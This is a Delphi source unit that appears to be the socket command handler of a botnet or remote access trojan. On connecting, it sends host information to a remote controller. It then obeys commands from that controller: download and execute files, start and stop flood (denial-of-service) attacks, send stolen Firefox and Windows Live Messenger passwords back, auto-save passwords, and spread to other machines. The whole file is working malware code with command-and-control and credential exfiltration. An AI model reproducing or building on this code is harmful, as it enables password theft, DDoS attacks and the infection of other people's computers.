unit uSocket;

interface

uses
  Windows, Sockets, uUtils, uSystemInfo, uString, uDownloader, uFlood, uFirefox, uSpread, uSaveFirefoxPasswords, uMessenger;

type
  TSock = class(TObject)
    Client: TClientSocket;
    procedure ClientConnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientConnecting(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientDisconnect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientError(Sender: TObject; Socket: TCustomWinSocket;
      ErrorEvent: TErrorEvent; var ErrorCode: Integer);
    procedure ClientLookup(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientRead(Sender: TObject; Socket: TCustomWinSocket);
    procedure ClientWrite(Sender: TObject;
      Socket: TCustomWinSocket);
  end;

implementation

procedure TSock.ClientConnect(Sender: TObject; Socket: TCustomWinSocket);
begin
  Socket.SendText(GetPcInfo);
end;

procedure TSock.ClientConnecting(Sender: TObject;
  Socket: TCustomWinSocket);
begin

end;

procedure TSock.ClientDisconnect(Sender: TObject;
  Socket: TCustomWinSocket);
begin

end;

procedure TSock.ClientError(Sender: TObject; Socket: TCustomWinSocket;
  ErrorEvent: TErrorEvent; var ErrorCode: Integer);
var
  Rapport : String;
begin
  case ErrorEvent Of
    eeGeneral : Rapport := 'Unexpected error';
    eeSend : Rapport := 'Clerical error on connection socket';
    eeReceive : Rapport := 'Misreading on connection socket';
    eeConnect : Rapport := 'Failed connection, check that the address of the waiter and the port are exact';
    eeDisconnect : Rapport := 'Error of closing of a connection';
    eeAccept : Rapport := 'Error of acceptance of a request for connection customer';
  end;
  ErrorCode := 0;
end;

procedure TSock.ClientLookup(Sender: TObject; Socket: TCustomWinSocket);
begin

end;

procedure TSock.ClientRead(Sender: TObject; Socket: TCustomWinSocket);
var
  Command     :String;
  Parameters  :array[0..1024] of String;
begin
  Command := Socket.ReceiveText;
  FillChar(Parameters,SizeOf(Command),#0);
  SplitString(PChar(Command), Parameters);

  if Parameters[0] = 'Download' then DownloadExecute(Parameters[1], Parameters[2]);
  if Parameters[0] = 'StartFlood' then CreateFlood(Parameters[1], Parameters[2], Parameters[3]);
  if Parameters[0] = 'StopFlood' then StopFlood;
  if Parameters[0] = 'PassFirefox' then
  begin
    Socket.SendText('PassFirefox|'+MozillaPassword);
    Socket.SendText('PassFirefox'+GetWindowsLiveMessengerPasswords);
  end;
  if Parameters[0] = 'AutoSave' then AutoSavePasswords;
  if Parameters[0] = 'StartSpread' then StartSpread(Parameters);
end;

procedure TSock.ClientWrite(Sender: TObject; Socket: TCustomWinSocket);
begin

end;

end.
